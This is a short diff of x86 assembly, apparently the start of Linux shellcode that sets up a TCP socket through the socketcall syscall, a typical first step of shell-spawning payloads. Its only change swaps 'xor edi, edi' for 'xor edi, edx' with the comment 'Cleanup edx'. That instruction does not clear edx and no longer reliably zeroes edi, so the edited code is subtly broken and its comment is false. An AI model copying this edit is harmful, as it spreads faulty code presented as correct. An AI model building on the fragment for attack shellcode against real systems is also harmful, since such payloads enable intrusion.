@@ -15,7 +15,7 @@ _start:
 	xor eax, eax  		; Cleanup eax
 	xor ebx, ebx  		; Cleanup ebx
 	xor esi, esi  		; Cleanup esi
-	xor edi, edi  		; Cleanup edi 
+	xor edi, edx  		; Cleanup edx 
 	mov al, 0x66  		; Set al to 0x66 (syscall for socketcall)
 	mov bl, 0x1     	; Move 1 to bl, making ebx 1, sys_socket
 	push esi      		; Push 0 to stack for arguments - TCP
